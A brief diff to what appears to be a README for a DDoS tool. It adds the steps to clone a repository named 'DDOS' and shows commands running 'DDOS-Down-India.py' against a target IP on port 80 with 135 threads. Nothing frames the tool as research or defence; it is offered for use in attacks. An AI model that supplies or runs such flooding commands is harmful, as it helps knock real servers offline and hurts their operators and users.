@@ -17,6 +17,8 @@ python3 -m pip install --upgrade
 pkg install pip2
 pip2 install requests
 pip2 install mechanize
+git clone https://github.com/Cyber-Nirob-Official/DDOS
+cd DDOS
 python DDOS-Down-India.py -s (IP) -t 135 -p 80
 python3 DDOS-Down-India.py -s (IP) -t 135 -p 80
 ```
